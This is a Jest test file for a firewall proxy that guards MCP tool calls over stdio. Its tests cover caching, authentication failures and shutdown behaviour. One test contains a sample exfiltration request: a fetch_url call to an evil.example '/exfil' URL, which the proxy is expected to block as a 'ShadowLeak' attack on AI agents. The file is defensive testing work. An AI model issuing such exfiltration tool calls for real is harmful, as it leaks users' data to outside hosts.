import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { PassThrough } from 'node:stream';
import { afterEach, beforeEach, describe, expect, it } from '@jest/globals';
import { createStdioFirewallProxy, StdioFirewallProxy } from '../src/stdio/proxy.js';

const proxyToken = '12345678901234567890123456789012';

const createNhiAuthorization = (scopes: string[]): string => {
  const payload = JSON.stringify({
    token: proxyToken,
    scopes,
  });

  return `Bearer ${Buffer.from(payload, 'utf8').toString('base64')}`;
};

const waitForJsonLine = async (stream: PassThrough): Promise<Record<string, unknown>> => {
  return new Promise((resolve, reject) => {
    let buffer = '';

    const cleanup = (): void => {
      stream.off('data', onData);
      stream.off('error', onError);
    };

    const onError = (error: Error): void => {
      cleanup();
      reject(error);
    };

    const onData = (chunk: Buffer | string): void => {
      buffer += chunk.toString();
      const newlineIndex = buffer.indexOf('\n');
      if (newlineIndex === -1) {
        return;
      }

      const line = buffer.slice(0, newlineIndex).trim();
      cleanup();
      resolve(JSON.parse(line) as Record<string, unknown>);
    };

    stream.on('data', onData);
    stream.on('error', onError);
  });
};

const waitForNoJsonLine = async (stream: PassThrough, timeoutMs: number): Promise<void> => {
  await new Promise<void>((resolve, reject) => {
    let buffer = '';
    let timer: NodeJS.Timeout | null = null;

    const cleanup = (): void => {
      if (timer) {
        clearTimeout(timer);
      }
      stream.off('data', onData);
      stream.off('error', onError);
    };

    const onError = (error: Error): void => {
      cleanup();
      reject(error);
    };

    const onData = (chunk: Buffer | string): void => {
      buffer += chunk.toString();
      if (buffer.includes('\n')) {
        cleanup();
        reject(new Error(`Expected no JSON line, received: ${buffer.trim()}`));
      }
    };

    timer = setTimeout(() => {
      cleanup();
      resolve();
    }, timeoutMs);

    stream.on('data', onData);
    stream.on('error', onError);
  });
};

describe('stdio firewall proxy', () => {
  let cacheDir: string;
  let clientInput: PassThrough;
  let clientOutput: PassThrough;
  let clientError: PassThrough;
  let proxy: StdioFirewallProxy;

  beforeEach(async () => {
    cacheDir = fs.mkdtempSync(path.join(os.tmpdir(), 'mcp-stdio-cache-'));
    clientInput = new PassThrough();
    clientOutput = new PassThrough();
    clientError = new PassThrough();

    proxy = createStdioFirewallProxy({
      input: clientInput,
      output: clientOutput,
      errorOutput: clientError,
      targetCommand: process.execPath,
      targetArgs: [path.join(process.cwd(), 'tests', 'fixtures', 'stdio-target.js')],
      cacheDir,
      cacheTtlSeconds: 60,
      alwaysCacheTools: ['read_file', 'read', 'open_file', 'list_directory', 'list_files', 'search_files', 'search'],
      neverCacheTools: ['write_file', 'write', 'create_file', 'execute_command', 'execute'],
      proxyAuthToken: proxyToken,
    });

    await proxy.start();
  });

  afterEach(async () => {
    await proxy.stop();
    fs.rmSync(cacheDir, { recursive: true, force: true });
  });

  it('proxies a tool call over stdio and serves the second response from cache', async () => {
    const request = {
      jsonrpc: '2.0',
      id: 1,
      method: 'tools/call',
      params: {
        name: 'search_files',
        arguments: {
          query: 'TODO',
        },
        _meta: {
          authorization: createNhiAuthorization(['tools.search_files']),
        },
      },
    };

    clientInput.write(JSON.stringify(request) + '\n');
    const firstResponse = await waitForJsonLine(clientOutput);

    clientInput.write(JSON.stringify(request) + '\n');
    const secondResponse = await waitForJsonLine(clientOutput);

    expect(firstResponse.result).toEqual({
      callCount: 1,
      tool: 'search_files',
      arguments: { query: 'TODO' },
    });
    expect(secondResponse.result).toEqual(firstResponse.result);
  });

  it('accepts a common alias contract over stdio', async () => {
    const request = {
      jsonrpc: '2.0',
      id: 5,
      method: 'tools/call',
      params: {
        name: 'read',
        arguments: {
          path: '/tmp/readme.md',
          encoding: 'utf8',
        },
        _meta: {
          authorization: createNhiAuthorization(['tools.read']),
        },
      },
    };

    clientInput.write(JSON.stringify(request) + '\n');
    const firstResponse = await waitForJsonLine(clientOutput);

    clientInput.write(JSON.stringify(request) + '\n');
    const secondResponse = await waitForJsonLine(clientOutput);

    expect(firstResponse.result).toEqual({
      callCount: 1,
      tool: 'read',
      arguments: { path: '/tmp/readme.md', encoding: 'utf8' },
    });
    expect(secondResponse.result).toEqual(firstResponse.result);
  });

  it('blocks ShadowLeak-style exfiltration before the target executes', async () => {
    const request = {
      jsonrpc: '2.0',
      id: 2,
      method: 'tools/call',
      params: {
        name: 'fetch_url',
        arguments: {
          url: 'https://evil.example/exfil?a=x&b=y&c=z',
        },
        _meta: {
          authorization: createNhiAuthorization(['tools.fetch_url']),
        },
      },
    };

    clientInput.write(JSON.stringify(request) + '\n');
    const response = await waitForJsonLine(clientOutput);

    expect(response.error).toBeDefined();
    expect((response.error as { data?: { code?: string } }).data?.code).toBe('SHADOWLEAK_DETECTED');
  });

  it('fails closed when stdio auth is configured but missing from the MCP message', async () => {
    const request = {
      jsonrpc: '2.0',
      id: 3,
      method: 'tools/call',
      params: {
        name: 'search_files',
        arguments: {
          query: 'missing-auth',
        },
      },
    };

    clientInput.write(JSON.stringify(request) + '\n');
    const response = await waitForJsonLine(clientOutput);

    expect((response.error as { data?: { code?: string } }).data?.code).toBe('AUTH_FAILURE');
  });

  it('drains an in-flight response before stopping when client stdin closes', async () => {
    await proxy.stop();

    proxy = createStdioFirewallProxy({
      input: clientInput,
      output: clientOutput,
      errorOutput: clientError,
      targetCommand: process.execPath,
      targetArgs: [path.join(process.cwd(), 'tests', 'fixtures', 'slow-stdio-target.js')],
      cacheDir,
      cacheTtlSeconds: 60,
      alwaysCacheTools: ['read_file', 'read', 'open_file', 'list_directory', 'list_files', 'search_files', 'search'],
      neverCacheTools: ['write_file', 'write', 'create_file', 'execute_command', 'execute'],
      proxyAuthToken: proxyToken,
    });

    await proxy.start();

    const request = {
      jsonrpc: '2.0',
      id: 4,
      method: 'tools/call',
      params: {
        name: 'search_files',
        arguments: {
          query: 'slow-close',
        },
        _meta: {
          authorization: createNhiAuthorization(['tools.search_files']),
        },
      },
    };

    clientInput.end(JSON.stringify(request) + '\n');
    const response = await waitForJsonLine(clientOutput);

    expect(response.result).toEqual({
      callCount: 1,
      tool: 'search_files',
      arguments: { query: 'slow-close' },
    });
  });

  it('stops after draining the final response so the target cannot keep emitting lines', async () => {
    await proxy.stop();

    proxy = createStdioFirewallProxy({
      input: clientInput,
      output: clientOutput,
      errorOutput: clientError,
      targetCommand: process.execPath,
      targetArgs: [path.join(process.cwd(), 'tests', 'fixtures', 'heartbeat-stdio-target.js')],
      cacheDir,
      cacheTtlSeconds: 60,
      alwaysCacheTools: ['read_file', 'read', 'open_file', 'list_directory', 'list_files', 'search_files', 'search'],
      neverCacheTools: ['write_file', 'write', 'create_file', 'execute_command', 'execute'],
      proxyAuthToken: proxyToken,
    });

    await proxy.start();

    const request = {
      jsonrpc: '2.0',
      id: 6,
      method: 'tools/call',
      params: {
        name: 'search_files',
        arguments: {
          query: 'heartbeat-close',
        },
        _meta: {
          authorization: createNhiAuthorization(['tools.search_files']),
        },
      },
    };

    clientInput.end(JSON.stringify(request) + '\n');
    const response = await waitForJsonLine(clientOutput);

    expect(response.result).toEqual({
      callCount: 1,
      tool: 'search_files',
      arguments: { query: 'heartbeat-close' },
    });

    await waitForNoJsonLine(clientOutput, 300);
  });
});
